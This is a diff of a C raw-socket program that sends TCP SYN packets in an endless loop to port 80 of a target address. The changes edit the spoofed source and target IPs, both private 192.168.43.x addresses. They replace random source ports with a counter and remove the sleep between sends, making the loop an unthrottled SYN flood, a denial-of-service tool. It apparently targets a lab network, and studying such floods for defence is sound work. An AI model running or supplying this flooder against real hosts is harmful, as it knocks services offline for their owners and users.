@@ -59,11 +59,11 @@ int main (void)
     struct sockaddr_in sin;
     struct pseudo_header psh;
      
-    strcpy(source_ip , "192.168.43.68"); //192.168.43.68
+    strcpy(source_ip , "192.168.43.123"); //192.168.43.68
    
     sin.sin_family = AF_INET;
     sin.sin_port = htons(80);
-    sin.sin_addr.s_addr = inet_addr ("192.168.43.218"); //10.86.2.64
+    sin.sin_addr.s_addr = inet_addr ("192.168.43.67"); //10.86.2.64
      
     memset (datagram, 0, 4096); /* zero out the buffer */
      
@@ -125,11 +125,8 @@ int main (void)
     int count = 0;
     while(1) {
         //Send the packet
-        tcph->syn = 1;
-        tcph->ack = 0;
-        tcph->seq = htons(count++);
-        tcph->ack_seq = 0;
-        tcph->source = htons (rand()%65535);
+        tcph->source = htons (count);
+        count = (count + 1) % 65535;
         // tcph->dest = htons (rand()%10000 + 100);
         memcpy(&psh.tcp , tcph , sizeof (struct tcphdr));
         tcph->check = csum( (unsigned short*) &psh , sizeof (struct pseudo_header));
@@ -139,19 +136,6 @@ int main (void)
         else {
             printf ("SYN Sent!\n");
         }
-        nanosleep(&sleep_time, NULL);
-
-        // tcph->syn = 0;
-        // tcph->ack = 1;
-        // tcph->ack_seq = 1;
-        // memcpy(&psh.tcp , tcph , sizeof (struct tcphdr));
-        // tcph->check = csum( (unsigned short*) &psh , sizeof (struct pseudo_header));
-        // if (sendto (s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof (sin)) < 0) {
-        //     printf ("error\n");
-        // }
-        // else {
-        //     printf ("ACK Sent!\n");
-        // }
         // nanosleep(&sleep_time, NULL);
     }
      
